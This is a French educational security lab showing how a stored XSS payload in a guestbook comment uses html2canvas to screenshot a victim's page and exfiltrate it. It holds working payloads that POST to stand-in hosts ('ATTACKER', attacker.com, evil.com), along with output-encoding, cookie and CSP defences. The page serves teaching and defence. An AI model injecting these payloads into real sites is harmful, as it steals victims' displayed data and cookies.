XSS : Injection & Capture d'ecran

Exploiter une Stored XSS pour exfiltrer un screenshot de la page victime

Avertissement legal Ce laboratoire est strictement educatif. L'exploitation de failles XSS sur des systemes sans autorisation explicite est un delit puni par la loi. Utilisez ces connaissances uniquement dans un cadre autorise (pentests, CTF, labos).

Le Cross-Site Scripting (XSS) est une vulnerabilite qui permet a un attaquant d'injecter du code JavaScript dans une page web consultee par d'autres utilisateurs. C'est l'une des failles les plus repandues (OWASP Top 10) et souvent sous-estimee.

Dans ce labo, on va au-dela du classique alert('XSS') pour demontrer un scenario d'exploitation realiste : capturer un screenshot de la page de la victime (contenant potentiellement des donnees sensibles) et l'envoyer a un serveur attaquant.

Les 3 types de XSS

TypeStockageDeclenchementGravite
Stored XSS Le payload est enregistre en BDD (commentaire, profil...) A chaque visite de la page par n'importe quel utilisateur CRITIQUE
Reflected XSS Le payload est dans l'URL ou un parametre Quand la victime clique sur un lien piege HAUTE
DOM-based XSS Jamais envoye au serveur Manipulation du DOM cote client (innerHTML, eval...) HAUTE
Ce labo utilise la Stored XSS Le payload est stocke comme commentaire dans un livre d'or. Chaque visiteur de la page execute involontairement le script malveillant. C'est le type le plus dangereux car il ne necessite aucune action de la victime (pas de clic sur un lien piege).

Ce que l'attaquant recupere

Anatomie du payload XSS

Le payload utilise dans ce labo :

<img src=x onerror="
  var s = document.createElement('script');
  s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
  s.onload = function() {
    html2canvas(document.body).then(function(canvas) {
      fetch('http://ATTACKER/api/exfiltration/capture', {
        method: 'POST',

        body: JSON.stringify({
          image: canvas.toDataURL(),

          userAgent: navigator.userAgent
        })
      })
    })
  };
  document.head.appendChild(s)
">

Decomposition etape par etape

EtapeCodeExplication
1. Declenchement <img src=x onerror="..."> L'image src=x n'existe pas, ce qui declenche onerror. Alternative a <script> qui peut etre filtre par certains WAF.
2. Chargement lib document.createElement('script') Charge dynamiquement html2canvas depuis un CDN. Technique classique pour importer des outils sans les embarquer.
3. Capture html2canvas(document.body) Capture le rendu visuel complet de la page dans un <canvas>. Inclut texte, images, formulaires, donnees affichees.
4. Conversion canvas.toDataURL() Convertit le canvas en image base64 (data:image/png;base64,...). Peut etre transmis en JSON sans upload de fichier.
5. Exfiltration fetch(url, {method: 'POST', ...}) Envoie silencieusement les donnees au serveur de l'attaquant. La victime ne voit rien, tout se passe en arriere-plan.
Pourquoi <img onerror> plutot que <script> ? Beaucoup de filtres naifs cherchent <script> et le supprime. Mais il existe des dizaines de vecteurs d'injection : onerror, onload, onfocus, onmouseover, svg/onload, etc. C'est pourquoi le filtrage par blacklist ne fonctionne pas.

html2canvas : capturer une page en image

html2canvas est une librairie JavaScript legitime qui "photographie" une page web en lisant le DOM et en le redessinant dans un <canvas>.

Utilisation normale (legitime)

// Generer un PDF ou une image d'un rapport web
html2canvas(document.querySelector("#report")).then(function(canvas) {
    var link = document.createElement('a');
    link.download = 'rapport.png';
    link.href = canvas.toDataURL();
    link.click();
});

Utilisation detournee (dans notre attaque)

// Capturer la page de la victime et exfiltrer
html2canvas(document.body).then(function(canvas) {
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({ image: canvas.toDataURL() })
    });
});
Dual-use html2canvas est un outil legitime utilise par des milliers de sites. Son utilisation malveillante illustre le concept de "dual-use" en cybersecurite : la meme technologie peut servir a des fins constructives ou destructives.

Exfiltration des donnees

Dans ce labo, l'exfiltration se fait vers une API dans la meme application. En realite, l'attaquant utiliserait un serveur externe.

Methodes d'exfiltration courantes

MethodeCommentAvantage
fetch() / XMLHttpRequest POST vers un serveur externe Peut envoyer de gros volumes (screenshots)
<img src="http://evil.com/steal?data=..."> Donnees dans l'URL de l'image Fonctionne meme si fetch est bloque
WebSocket Canal bidirectionnel vers l'attaquant Communication interactive en temps reel
DNS exfiltration Donnees encodees dans des requetes DNS Traverse la plupart des firewalls

Structure des donnees envoyees

{
    "image": "data:image/png;base64,iVBORw0KGgo...",  // Screenshot complet
    "url": "http://bank.com/account/dashboard",      // Page visitee
    "cookies": "session=abc123; user=jean",            // Cookies accessibles
    "userAgent": "Mozilla/5.0 (Windows NT 10.0...)"   // Fingerprint
}

Code vulnerable vs securise

VULNERABLE : Html.Raw()

// Le contenu est injecte tel quel dans le HTML
@("@")Html.Raw(comment.Content)

// Resultat si content = "<script>alert(1)</script>" :
<script>alert(1)</script>
// Le navigateur EXECUTE le script !

SECURISE : Encodage Razor

// Razor encode automatiquement les caracteres HTML
@("@")comment.Content

// Resultat si content = "<script>alert(1)</script>" :
&lt;script&gt;alert(1)&lt;/script&gt;
// Le navigateur AFFICHE le texte brut !
Regle d'or Ne JAMAIS utiliser Html.Raw() avec du contenu provenant d'un utilisateur. Razor encode par defaut avec @("@")variable. Faites confiance au framework.

Exercices pour les etudiants

Se proteger du XSS

ProtectionNiveauDetails
Encodage des sorties Obligatoire Utiliser @("@")variable en Razor (pas Html.Raw). Encoder selon le contexte (HTML, JS, URL, CSS).
Validation des entrees Obligatoire Whitelist de caracteres autorises. Rejeter les patterns suspects.
Content Security Policy Defense en profondeur Bloque les scripts inline et les domaines non autorises (voir labo 1).
HttpOnly cookies Obligatoire Empeche JavaScript de lire les cookies de session.
SameSite cookies Recommande Empeche l'envoi de cookies dans les requetes cross-site.
X-XSS-Protection Obsolete Ancien filtre navigateur. Remplace par CSP. Ne plus utiliser.
Ordre de priorite 1. Encoder les sorties → 2. Valider les entrees → 3. CSP → 4. HttpOnly/SameSite cookies. L'encodage des sorties est la protection la plus importante. Les autres sont des couches supplementaires.

Lien avec le Labo 1 (CSP)

Ce labo demontre pourquoi CSP est necessaire. Voici ce que CSP aurait bloque dans notre attaque :

Action du payloadDirective CSP qui bloqueResultat
onerror="..." (inline handler) script-src sans 'unsafe-inline' BLOQUE
Chargement de html2canvas depuis CDN script-src 'self' (CDN non autorise) BLOQUE
fetch() vers serveur attaquant connect-src 'self' (domaine externe) BLOQUE
Mais attention Si CSP autorise 'unsafe-inline' (erreur courante), le handler onerror s'execute. Si CSP autorise le CDN dans script-src, la lib est chargee. Et si connect-src est absent, default-src s'applique. Une CSP mal configuree = pas de protection.
